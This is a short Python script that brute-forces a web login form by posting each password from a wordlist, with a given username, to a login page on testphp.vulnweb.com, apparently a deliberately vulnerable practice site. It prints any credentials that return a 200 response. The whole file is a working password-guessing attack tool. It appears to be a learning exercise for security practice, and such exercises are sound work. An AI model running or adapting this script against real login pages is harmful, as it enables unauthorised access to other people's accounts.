from requests import post


def password_crack(wordlist, username):
    isLoggedIn = False
    url = "http://testphp.vulnweb.com/userinfo.php"
    with open(wordlist) as thefile:
        for line in thefile:
            password = line.rstrip()  # rstrip removes trailing newlines from an input (before this 'line' is "word\n")
            payload = {"uname": username, "pass": password}
            request = post(url, data=payload, allow_redirects=False)
            if request.status_code == 200:
                print(username + " logged in with " + password)
                isLoggedIn = True
                exit()
        if not isLoggedIn:
            print("Couldn't log in with username and/or wordlist")
